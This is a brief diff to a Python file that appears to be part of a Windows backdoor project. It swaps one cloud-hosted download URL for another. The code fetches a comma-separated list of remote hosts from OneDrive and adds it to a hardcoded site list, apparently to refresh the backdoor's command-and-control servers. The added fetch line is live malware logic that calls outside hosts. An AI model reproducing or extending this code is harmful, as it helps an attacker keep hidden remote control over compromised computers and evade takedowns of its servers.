@@ -14,7 +14,8 @@ import socket
 
 #mainsite = urllib2.urlopen("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt")
 #mainsite = urllib2.urlopen("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF")
-mainsite = urllib2.urlopen("https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny")
+#mainsite = urllib2.urlopen("https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny")
+mainsite = urllib2.urlopen("https://onedrive.live.com/download.aspx?cid=7C80BDF021F1D245&authKey=%21AK7fmy%5FJWYJYexo&resid=7C80BDF021F1D245%213188&ithint=%2Etxt")
 #print mainsite.text
 sites = ["https://paner.altervista.org"]#, mainsite.text]
 sites.extend(mainsite.read().split(",") )
